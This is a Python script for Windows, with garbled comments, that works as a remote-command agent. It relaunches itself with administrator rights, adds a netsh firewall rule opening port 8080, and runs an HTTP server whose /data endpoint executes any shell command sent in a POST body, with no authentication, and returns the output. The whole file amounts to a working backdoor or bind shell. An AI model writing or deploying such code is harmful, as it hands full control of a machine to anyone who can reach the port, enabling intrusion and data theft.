# -*- coding: utf-8 -*-

import os
import sys
import ctypes
import json
import subprocess
from http.server import BaseHTTPRequestHandler, HTTPServer

# ���� ���� ���� ����ڰ� ������ ������ ������ �ִ��� Ȯ���մϴ�.
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# ���α׷��� ������ �������� �����մϴ�.
def run_as_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

# ��ȭ�� ��Ģ�� �߰��Ͽ� Ư�� ��Ʈ�� �����ݴϴ�.
def add_firewall_rule(port):
    try:
        subprocess.run(f"netsh advfirewall firewall add rule name=\"Open Port {port}\" dir=in action=allow protocol=TCP localport={port}", shell=True, check=True)
        print(f"Successfully added firewall rule for port {port}")
    except subprocess.CalledProcessError as e:
        print(f"Failed to add firewall rule for port {port}. Error: {e}")

# �ܺο��� ���޹��� ��ɾ �����ϰ� ����� ��ȯ�մϴ�.
def exec_command(command, arg):
    try:
        result = subprocess.check_output(f"{command} {arg}", shell=True).decode('utf-8')
        return {"status": "success", "output": result}
    except Exception as e:
        return {"status": "error", "message": str(e)}

# HTTP ��û�� ó���ϴ� Ŭ����
class MyRequestHandler(BaseHTTPRequestHandler):
    # GET ��û ó��
    def do_GET(self):
        if self.path == "/ping":
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success", "message": "Agent is alive"}).encode())

    # POST ��û ó��
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data)

        if self.path == "/data":
            command = data.get("command")
            arg = data.get("arg")

            if command:
                response = exec_command(command, arg)
            else:
                response = {"status": "error", "message": "No command provided"}
        else:
            response = {"status": "error", "message": "Invalid path"}

        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(response).encode())

# ������ �����ϴ� �Լ�
def run_server(port=8080):
    server_address = ('', port)
    httpd = HTTPServer(server_address, MyRequestHandler)
    print(f"Server running on port {port}")
    httpd.serve_forever()

# ���� ���� ����
if __name__ == "__main__":
    if is_admin():
        add_firewall_rule(8080)  # 8080 ��Ʈ�� ��ȭ���� �߰�
        run_server()
    else:
        print("Trying to get admin privileges...")
        run_as_admin()